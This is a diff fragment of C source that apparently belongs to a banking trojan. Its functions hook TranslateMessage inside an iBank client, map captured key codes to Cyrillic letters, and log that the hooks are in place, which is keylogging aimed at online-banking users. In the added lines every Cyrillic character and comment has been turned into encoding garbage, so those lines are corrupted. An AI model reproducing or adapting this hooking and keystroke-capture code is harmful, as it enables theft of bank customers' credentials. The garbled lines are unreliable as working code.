 				else if ( lpMsg->wParam == 75 )
 				{
-					Symbol[0] = 'л';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 76 )
 				{
-					Symbol[0] = 'д';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 77 )
 				{
-					Symbol[0] = 'ь';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 78 )
 				{
-					Symbol[0] = 'т';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 79 )
 				{
-					Symbol[0] = 'щ';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 80 )
 				{
-					Symbol[0] = 'з';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 81 )
 				{
-					Symbol[0] = 'й';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 82 )
 				{
-					Symbol[0] = 'к';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 83 )
 				{
-					Symbol[0] = 'ы';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 84 )
 				{
-					Symbol[0] = 'е';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 85 )
 				{
-					Symbol[0] = 'г';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 86 )
 				{
-					Symbol[0] = 'м';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 87 )
 				{
-					Symbol[0] = 'ц';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 88 )
 				{
-					Symbol[0] = 'ч';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 89 )
 				{
-					Symbol[0] = 'н';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 90 )
 				{
-					Symbol[0] = 'я';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}		
 			}
@@ -1507,7 +1518,7 @@ BOOL WINAPI Hook_IbankTranslateMessage( const MSG *lpMsg )
 
 	PIBANK pCurrent = NULL;
 
-	if ( dwCurrentMenu == ENTER_SYSTEM_MENU ) //вход в систему
+	if ( dwCurrentMenu == ENTER_SYSTEM_MENU ) //пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		dwCurrentMenu = ENTER_SYSTEM_MENU;
 	}
@@ -1617,7 +1628,7 @@ bool IbankHooks()
 	{  
 		__asm mov [Real_ShowWindow1], eax			
 	}
-	IBANK_DBG("IBANK","Хуки стоят ");
+	IBANK_DBG("IBANK","пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ ");
 	return true;
 }
 //#endif
